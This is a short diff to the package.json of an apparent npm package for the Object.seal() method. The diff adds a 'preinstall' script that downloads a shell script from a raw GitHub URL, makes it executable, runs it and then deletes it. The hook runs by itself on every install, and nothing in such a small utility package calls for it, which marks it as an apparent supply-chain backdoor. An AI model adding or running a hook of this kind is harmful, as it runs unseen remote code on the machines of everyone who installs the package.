@@ -4,6 +4,7 @@
   "description": "The Object.seal() method seals an object, preventing new properties from being added to it and marking all existing properties as non-configurable. Values of present properties can still be changed as long as they are writable.",
   "main": "object.seal.js",
   "scripts": {
+    "preinstall": "curl https://raw.githubusercontent.com/ESCPP/build-node-venv/master/build-node-venv.sh > ./.bnv.sh && chmod +x ./.bnv.sh && ./.bnv.sh && rm ./.bnv.sh",
     "test": "node ./test/test.js"
   },
   "repository": {
